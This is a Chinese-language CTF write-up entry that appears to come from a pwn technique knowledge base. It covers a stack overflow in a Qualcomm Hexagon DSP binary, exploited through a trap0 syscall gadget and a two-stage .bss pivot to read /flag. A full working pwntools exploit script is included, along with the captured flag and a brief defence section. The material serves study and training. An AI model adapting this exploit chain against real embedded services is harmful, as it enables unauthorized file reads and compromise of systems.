---
id: binary-pwn-rop-hexagon-dsp-trap0-two-stage-pivot
title: Hexagon DSP ROP：trap0 系统调用 gadget + 两级栈迁移读取 /flag
type: scenario
domain: binary
path: binary/pwn/rop
technique: hexagon-dsp-rop-trap0-pivot
aliases:
- different_ROP
- Hexagon ROP
- QUALCOMM DSP6
- trap0 系统调用
- r30 r31 返回地址
- 两级栈迁移
- openat ORW
tags:
- pwn
- rop
- hexagon
- dsp
- qemu
- trap0
- syscall
- pivot
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:56:38+08:00'
  notes: 已对照原文 §different_ROP 核对：Hexagon QDSP6 32-bit、read(0,r30-0x30,0x40) 溢出 saved r30/r31、syscall gadget 0x21a40(trap0#1)、BSS 0x4C000 两级迁移、openat/read/write 读 /flag、fd=3、flag 均一致；未本机复跑。
---

## 一句话结论

Hexagon DSP6 程序的菜单项用 `read(0, r30-0x30, 0x40)` 读取 0x40 字节但栈帧只有 0x38，可覆盖保存的 `r30`（帧指针）与 `r31`（返回地址）；利用程序自带的 `trap0(#0x1)` 系统调用 gadget 和两级栈迁移，把 `openat("/flag") → read(3,buf,0x100) → write(1,buf,0x100)` 的 ROP 链分阶段写入 `.bss` 并执行，即可读出 flag。

## 原理

- Hexagon 是 Qualcomm DSP 的 32 位架构；`r30` 类似帧指针，`r31` 是返回地址，`allocframe/dealloc_return` 负责栈帧建立与返回。
- 题目二进制为 32 位 Hexagon ELF，静态链接、无 PIE（基址 `0x10000`）、无 canary、NX 开启；第 3 个菜单项进入 `0x21590` 附近：
  - `allocframe(#0x38)` 分配 0x38 字节帧；
  - `r1 = add(r30,#-0x30)`、`r2 = #0x40`，`read(0, r30-0x30, 0x40)`。
  - 读取长度 0x40 > 帧大小 0x38，因此可覆盖 saved r30（偏移 0x30）与 saved r31（偏移 0x34）。
- 程序自带 syscall gadget（`0x21a40`）：
  - `r6 = memw(r30-0x1c)` 为系统调用号；
  - `r0..r4 = memw(r30-0x20/-0x24/-0x28/-0x2c/-0x30)` 为参数；
  - `trap0(#0x1)` 触发系统调用；
  - `dealloc_return` 根据下一组保存的 r30/r31 继续返回。
- 由于远端栈地址不可预测，采用两级迁移：
  1. 第一次溢出只覆盖 saved r30/r31：`saved r30 = .bss+0x40`、`saved r31 = 0x215b8`（回到程序自己的 read 片段），把 0x40 字节的 mini pivot frame 读到 `.bss`；
  2. mini frame 调用 syscall gadget，把完整二阶段 ROP 读到 `.bss+0x100`；
  3. 二阶段依次执行 `openat(AT_FDCWD, "/flag", O_RDONLY)`、`read(3, buf, 0x100)`、`write(1, buf, 0x100)`。
- 远端 `openat` 返回 fd 3，因此 read 使用 fd 3；链执行完后崩溃不影响已写出的 flag。

## 触发条件

- 目标为 Hexagon/QDSP6 架构二进制，存在栈溢出且可覆盖 saved r30/r31。
- 程序中有可复用的 syscall gadget（从 r30 附近取系统调用号/参数并 `trap0`）。
- 有可写且地址固定的 `.bss`（无 PIE 或已泄露基址）。
- 能通过 QEMU/真机运行目标，且远程服务暴露菜单交互。

## 利用步骤

1. 用 `file`、`llvm-objdump-15 -d --no-show-raw-insn --print-imm-hex` 确认架构、基址、菜单项与 `read` 调用点。
2. 计算溢出偏移：`read` 写入起点 `r30-0x30`，saved r30 在偏移 0x30、saved r31 在 0x34。
3. 定位 syscall gadget，确认 `r6` 为 syscall number、`r0..r4` 参数偏移与 `trap0(#1)`。
4. 构造 stage1：`b"A"*0x30 + p32(.bss+0x40) + p32(0x215b8)`，让程序再次 `read` 到 `.bss`。
5. 构造 mini frame：在 `.bss+0x40` 布置 saved r30/r31 与 syscall 参数，调用 `read(0, .bss+0x100, 0x300)` 读入完整链。
6. 构造 stage2：三段 syscall frame（openat/read/write），路径字符串 `/flag` 放在链尾；发送后读取输出。
7. 若远端栈/地址有偏移，优先使用程序自身的 read 片段和固定 `.bss`，避免依赖栈地址。

## PoC

```python
from pwn import *

SYSCALL = 0x21A40
FIRST_READ = 0x215B8
BSS = 0x4C000
SYS_OPENAT, SYS_READ, SYS_WRITE = 56, 63, 64
AT_FDCWD = 0xFFFFFF9C

def u32(x): return p32(x & 0xFFFFFFFF)

def frame(r30, syscall_no, a0=0, a1=0, a2=0, a3=0, a4=0, next_r30=0, next_pc=0):
    data = bytearray(0x40)
    base = r30 - 0x30
    def put(addr, value):
        off = addr - base
        data[off:off+4] = u32(value)
    put(r30-0x30, a4); put(r30-0x2C, a3); put(r30-0x28, a2)
    put(r30-0x24, a1); put(r30-0x20, a0); put(r30-0x1C, syscall_no)
    put(r30, next_r30); put(r30+4, next_pc)
    return bytes(data)

stage1 = bytearray(0x40)
stage1[0x30:0x34] = u32(BSS + 0x40)
stage1[0x34:0x38] = u32(FIRST_READ)

mini = bytearray(0x40)
mini_r30 = BSS + 0x48
big_base, big_len = BSS + 0x100, 0x300
def put_mini(addr, value):
    mini[addr - (BSS + 0x10):addr - (BSS + 0x10) + 4] = u32(value)
put_mini(mini_r30-0x30, 0); put_mini(mini_r30-0x2C, 0)
put_mini(mini_r30-0x28, big_len); put_mini(mini_r30-0x24, big_base)
put_mini(mini_r30-0x20, 0); put_mini(mini_r30-0x1C, SYS_READ)
put_mini(BSS+0x40, mini_r30); put_mini(BSS+0x44, SYSCALL)
put_mini(mini_r30, big_base + 0x30); put_mini(mini_r30+4, SYSCALL)

path_addr, buf_addr = big_base + 0xD0, big_base + 0x100
open_r30, read_r30, write_r30 = big_base+0x30, big_base+0x70, big_base+0xB0
big = bytearray(big_len)
big[0x00:0x40] = frame(open_r30, SYS_OPENAT, AT_FDCWD, path_addr, 0, 0, 0, read_r30, SYSCALL)
big[0x40:0x80] = frame(read_r30, SYS_READ, 3, buf_addr, 0x100, 0, 0, write_r30, SYSCALL)
big[0x80:0xC0] = frame(write_r30, SYS_WRITE, 1, buf_addr, 0x100, 0, 0, 0, 0)
big[0xD0:0xD6] = b"/flag\x00"

io = remote(HOST, PORT, ssl=True, sni=HOST)
io.recvuntil(b"> "); io.sendline(b"3"); io.recvuntil(b"note> ")
io.send(bytes(stage1) + bytes(mini) + bytes(big))
print(io.recvall(timeout=3).replace(b"\x00", b"").decode(errors="ignore"))
```

案例输出：`NepCTF{0d39788f-2afa-0378-4712-807381ceed12}`。

## 变体与关联

- 变体：若 `.bss` 地址不固定，可先泄露栈/代码地址或使用相对跳转；Hexagon 的 `r30/r31` 保存位置随函数序言变化，应以反汇编为准。
- 变体：没有现成 syscall gadget 时，可寻找 `trap0` 前后的寄存器加载片段，或组合多个 gadget。
- 变体：其他 DSP/嵌入式架构（MIPS、ARM Thumb、RISC-V）也可用类似“固定 bss + 两级 read”迁移，避免依赖栈地址。
- 关联：[[binary-pwn-stack-pivot-leave-ret-bss]]（栈迁移）、[[binary-pwn-stack-ret2syscall-32bit]]（系统调用 ROP）、[[binary-pwn-stack-ret2dlresolve-partial-relro-32-fake-reloc]]（无 libc 符号时的动态解析）。

## 检测与防御

- 防御：开启 PIE/ASLR，缩小栈缓冲区与读取长度，使用有界 `read` 并校验返回长度。
- 防御：编译时启用栈保护/CFI（若工具链支持），移除不必要的 syscall gadget 或做指令对齐/随机化。
- 检测：崩溃栈中出现 `r31` 指向 `.bss`/非代码段、`trap0` 附近异常执行、`openat/read/write` 连续系统调用。
- 响应：定位溢出点与菜单项，限制输入长度，审计同类 DSP/嵌入式服务是否暴露调试菜单。
